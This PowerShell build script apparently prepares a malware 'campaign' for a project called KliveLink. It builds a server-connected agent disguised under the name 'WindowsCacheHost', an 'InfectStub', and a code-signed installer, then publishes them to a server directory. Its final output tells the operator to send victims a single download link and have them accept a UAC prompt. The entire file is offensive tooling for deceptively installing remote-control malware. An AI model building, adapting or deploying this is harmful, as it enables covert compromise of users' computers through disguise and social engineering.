param(
    [Parameter(Mandatory = $true)][string]$Server,
    [Parameter(Mandatory = $true)][string]$Token,
    [string]$Output = "artifacts/campaign",
    [string]$SignCert = "",
    [string]$PinSha256 = "",
    [string]$TimestampUrl = "http://timestamp.digicert.com",
    [string]$ServerBuild = ""
)

$ErrorActionPreference = "Stop"
$repo = (Resolve-Path (Join-Path $PSScriptRoot "..")).Path
$outPath = Join-Path $repo $Output
$agentDir = Join-Path $outPath "agent"
$setupDir = Join-Path $outPath "setup"

& (Join-Path $repo "KliveLink\deploy\build-v2.ps1") `
    -Server $Server -Token $Token -Output (Join-Path $Output "agent") `
    -AssemblyName "WindowsCacheHost" -SignCert $SignCert -PinSha256 $PinSha256 -TimestampUrl $TimestampUrl
if ($LASTEXITCODE -ne 0) { throw "Agent build failed." }

& (Join-Path $repo "KliveLink.InfectStub\build-stub.ps1") -Output (Join-Path $Output "stub")
if ($LASTEXITCODE -ne 0) { throw "Infect stub build failed." }

& (Join-Path $repo "KliveLink.Setup\build-setup.ps1") `
    -Agent (Join-Path $agentDir "WindowsCacheHost.exe") `
    -Config (Join-Path $agentDir "klive.config.json") `
    -Output (Join-Path $Output "setup") -SignCert $SignCert -TimestampUrl $TimestampUrl
if ($LASTEXITCODE -ne 0) { throw "Installer build failed." }

$installer = Join-Path $setupDir "WindowsCacheHostSetup.exe"
if ($ServerBuild) {
    $serverDir = Join-Path $repo $ServerBuild
    New-Item -ItemType Directory -Force -Path $serverDir | Out-Null
    Copy-Item (Join-Path $agentDir "WindowsCacheHost.exe") $serverDir -Force
    Copy-Item (Join-Path $agentDir "klive.config.json") $serverDir -Force
    Copy-Item (Join-Path $Output "stub\InfectStub.exe") $serverDir -Force
    Copy-Item $installer $serverDir -Force
    Write-Host "Published agent, config, stub and installer to $serverDir" -ForegroundColor Green
}
Write-Host ""
Write-Host "Campaign ready." -ForegroundColor Green
Write-Host "Agent:     $(Join-Path $agentDir 'WindowsCacheHost.exe')"
Write-Host "Installer: $installer"
Write-Host ""
Write-Host "Host the installer at a URL and send that single link. The user downloads it, accepts UAC, and is done."
